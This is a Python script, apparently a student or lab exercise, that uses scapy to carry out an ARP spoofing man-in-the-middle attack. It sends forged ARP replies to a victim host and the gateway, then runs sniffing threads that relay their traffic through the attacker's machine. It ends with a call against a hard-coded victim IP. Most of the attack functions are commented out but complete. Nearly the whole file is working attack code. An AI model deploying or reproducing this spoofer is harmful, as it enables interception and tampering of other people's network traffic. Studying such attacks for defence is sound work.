# send the gateway arp replies in intervals: 
# send the victim arp replies in intevals:



# thread1 is forwarding info from gw to victim
# thread2 is forwarding info from victim tp gw

# data from gw to victim: should change "src" value to my MAC
# data from victim to gw: should change dest value to me.


# testing: 
# 1. sniff with wireshark and see if I (as an attacker) see my MAC in the icmp messages(pings)
# that were adressed to the victim ip.



import scapy.all as scapy
import re #re functions used to parse strings #
import subprocess # subprocess functions used #
from scapy.config import conf
from scapy.interfaces import get_if_list
from scapy.layers.l2 import Ether, ARP
from scapy.packet import ls
from scapy.sendrecv import srp, sendp, sniff
import datetime
import time
import threading

###### Find gatewayIP - returns gateway ip as a string #######
# def GW_IP_FINDER():
#     ip_route_string = str(subprocess.check_output(['ip', 'route']))
#     regex_ip = r'\s(((25[0-5]|2[0-4][0-9]|[01]?[0-9]?[0-9])\.){3}((25[0-5]|2[0-4][0-9]|[01]?[0-9]?[0-9])\s|$))'
#     match = re.search(regex_ip, ip_route_string)
#     return re.sub("[ ']","",match.group())

def GW_IP_FINDER():
    return conf.route.route("0.0.0.0")[2]

 
# ###### returns mac of victim, when given IP  ######
# def IP2Mac(victim_ip):
#     ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=victim_ip), timeout=3, verbose=0)
#     if ans:
#         return ans[0][1].src

# ##### creates arp response packet with attack mac to victim mac #####

# def Arp_Resonse_Maker(default_gateway_ip ,attack_mac , victim_mac , victim_ip):

#     ###create arp packet:
#     arp_packet = Ether() / ARP()
#     arp_packet[ARP].hwsrc = attack_mac   ### hwsrc = ARPSourceMACField . set source mac to attack mac
#     arp_packet[ARP].pdst = victim_ip    ### set dst ip to victim ip
#     arp_packet[Ether].hwdst = victim_mac     ### set dest mac to victim mac
#     arp_packet[ARP].psrc = default_gateway_ip      ### set src ip to gateway ip
#     arp_packet[ARP].op = 2     ### set the type to 2 - response packet
#     return arp_packet


# def gateway2victim_handler(packet,default_gateway_mac,default_gateway_ip ,attack_mac , victim_mac , victim_ip):
#     packet[Ether].dst = victim_mac
#     packet[Ether].src = attack_mac
#     sendp(packet)

# def gateway2victim(default_gateway_mac,default_gateway_ip ,attack_mac , victim_mac , victim_ip, seconds_to_run):
#     sniff(filter = f"dst host {victim_ip} and src host {default_gateway_ip}",prn=lambda packet: \
#         gateway2victim_handler(packet, default_gateway_mac, default_gateway_ip ,attack_mac , victim_mac , victim_ip),\
#           timeout=seconds_to_run)

# def victim2gateway_handler(packet,default_gateway_mac,default_gateway_ip ,attack_mac , victim_mac , victim_ip):
#     packet[Ether].dst = default_gateway_mac
#     packet[Ether].src = attack_mac
#     sendp(packet)

# def victim2gateway(default_gateway_mac,default_gateway_ip ,attack_mac , victim_mac , victim_ip, seconds_to_run):
#     sniff(filter = f"src host {victim_ip} and dst host {default_gateway_ip}", prn=lambda packet: victim2gateway_handler(packet, default_gateway_mac, default_gateway_ip ,attack_mac , victim_mac , victim_ip), timeout=seconds_to_run)

# ##### ARP Spoofing ######


# def ArpSpoofer(victim_ip, seconds_to_run):

#     ### find gatewayIP ###
#     default_gateway_ip = GW_IP_FINDER()
#     ### find mac of attacker ###
#     attack_mac = Ether().src
#     ### find mac of victim ###
#     victim_mac = IP2Mac(victim_ip)
#     ### find mac of default gateway ###
#     default_gateway_mac = IP2Mac(default_gateway_ip)

#     ### send arp response to the victim, telling him that the mac of the default gateway is "attack mac" ###

#     ##create arp response packets for vistim and gateway:
#     arp_response_packet_victim = Arp_Resonse_Maker(default_gateway_ip,attack_mac,victim_mac,victim_ip)
#     arp_response_packet_gateway = Arp_Resonse_Maker(victim_ip,attack_mac,default_gateway_mac,default_gateway_ip)

#     ##start timer
#     time_start = datetime.datetime.now()

#     ### define sniffing threads:

#     t1 = threading.Thread(target=gateway2victim, args=(default_gateway_mac,default_gateway_ip,attack_mac,victim_mac,victim_ip,seconds_to_run))
#     t2 = threading.Thread(target=victim2gateway, args=(default_gateway_mac,default_gateway_ip,attack_mac,victim_mac,victim_ip,seconds_to_run))

#     #### start sending response packets and dealing with traffic, and spawn sniff threads -
#     sendp(arp_response_packet_victim)
#     sendp(arp_response_packet_gateway)
#     time.sleep(1)
#     # starting thread 1
#     t1.start()
#     # starting thread 2
#     t2.start()

#     while (datetime.datetime.now()-time_start).total_seconds() < seconds_to_run:
#         time.sleep(5)
#         sendp(arp_response_packet_victim)
#         sendp(arp_response_packet_gateway)

#     ### join sniffing threads:
#     # wait until thread 1 is completely executed
#     t1.join()
#     # wait until thread 2 is completely executed
#     t2.join()


# ArpSpoofer("10.1.0.174",10)
